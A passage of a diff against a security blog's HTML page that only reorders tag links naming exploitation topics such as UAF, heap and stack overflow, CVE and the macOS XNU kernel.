               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">cve</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">IPC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">vm</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
@@ -1710,34 +1723,6 @@ if (! have_lock) {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">UAF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">堆溢出</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">cve</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">IPC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">vm</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
               </li>
              
@@ -1746,7 +1731,23 @@ if (! have_lock) {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">栈溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">堆溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">UAF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1755,6 +1756,14 @@ if (! have_lock) {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">format</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">调试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1770,11 +1779,15 @@ if (! have_lock) {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+                <a href="javascript:void(0)" class="js-tag color4">xnu</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">调试</a>
+                <a href="javascript:void(0)" class="js-tag color3">macos内核</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">BSD</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1787,18 +1800,6 @@ if (! have_lock) {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">stub</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xnu</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">macos内核</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">BSD</a>
               </li>
             
             <div class="clearfix"></div>
